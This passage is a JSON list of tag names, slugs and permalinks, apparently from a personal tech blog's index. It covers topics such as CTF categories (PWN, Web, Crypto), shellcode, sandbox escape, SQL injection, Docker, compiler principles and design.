:[{"name":"PWN","slug":"PWN","permalink":"https://blog.beacox.space/tags/PWN/"},{"name":"Misc","slug":"Misc","permalink":"https://blog.beacox.space/tags/Misc/"},{"name":"Reverse","slug":"Reverse","permalink":"https://blog.beacox.space/tags/Reverse/"},{"name":"Crypto","slug":"Crypto","permalink":"https://blog.beacox.space/tags/Crypto/"},{"name":"Web","slug":"Web","permalink":"https://blog.beacox.space/tags/Web/"},{"name":"Windows","slug":"Windows","permalink":"https://blog.beacox.space/tags/Windows/"},{"name":"ASLR","slug":"ASLR","permalink":"https://blog.beacox.space/tags/ASLR/"},{"name":"shellcode","slug":"shellcode","permalink":"https://blog.beacox.space/tags/shellcode/"},{"name":"PoC","slug":"PoC","permalink":"https://blog.beacox.space/tags/PoC/"},{"name":"推理","slug":"推理","permalink":"https://blog.beacox.space/tags/%E6%8E%A8%E7%90%86/"},{"name":"2D","slug":"2D","permalink":"https://blog.beacox.space/tags/2D/"},{"name":"沙箱","slug":"沙箱","permalink":"https://blog.beacox.space/tags/%E6%B2%99%E7%AE%B1/"},{"name":"沙箱逃逸","slug":"沙箱逃逸","permalink":"https://blog.beacox.space/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"name":"Docker","slug":"Docker","permalink":"https://blog.beacox.space/tags/Docker/"},{"name":"shell","slug":"shell","permalink":"https://blog.beacox.space/tags/shell/"},{"name":"美化","slug":"美化","permalink":"https://blog.beacox.space/tags/%E7%BE%8E%E5%8C%96/"},{"name":"隐私计算","slug":"隐私计算","permalink":"https://blog.beacox.space/tags/%E9%9A%90%E7%A7%81%E8%AE%A1%E7%AE%97/"},{"name":"开源","slug":"开源","permalink":"https://blog.beacox.space/tags/%E5%BC%80%E6%BA%90/"},{"name":"C","slug":"C","permalink":"https://blog.beacox.space/tags/C/"},{"name":"设计","slug":"设计","permalink":"https://blog.beacox.space/tags/%E8%AE%BE%E8%AE%A1/"},{"name":"编译原理","slug":"编译原理","permalink":"https://blog.beacox.space/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"},{"name":"竞赛","slug":"竞赛","permalink":"https://blog.beacox.space/tags/%E7%AB%9E%E8%B5%9B/"},{"name":"海报","slug":"海报","permalink":"https://blog.beacox.space/tags/%E6%B5%B7%E6%8A%A5/"},{"name":"节日","slug":"节日","permalink":"https://blog.beacox.space/tags/%E8%8A%82%E6%97%A5/"},{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://blog.beacox.space/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"},{"name":"ShareX","slug":"ShareX","permalink":"https://blog.beacox.space/tags/ShareX/"},{"name":"javascript","slug":"javascript","permalink":"https://blog.beacox.space/tags/javascript/"},{"name":"python","slug":"python","permalink":"https://blog.beacox.space/tags/python/"},{"name":"Actions","slug":"Actions","permalink":"https://blog.beacox.space/tags/Actions/"},{"name":"CSAPP","slug":"CSAPP","permalink":"https://blog.beacox.space/tags/CSAPP/"},{"name":"系统","slug":"系统","permalink":"https://blog.beacox.space/tags/%E7%B3%BB%E7%BB%9F/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://blog.beacox.space/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"npm","slug":"npm","permalink":"https://blog.beacox.space/tags/npm/"},{"name":"GitHub","slug":"GitHub","permalink":"https://blog.beacox.space/tags/GitHub/"},{"name":"shields","slug":"shields","permalink":"https://blog.beacox.space/tags/shields/"},{"name":"Markdown","slug":"Markdown","permalink":"https://blog.beacox.space/tags/Markdown/"}]}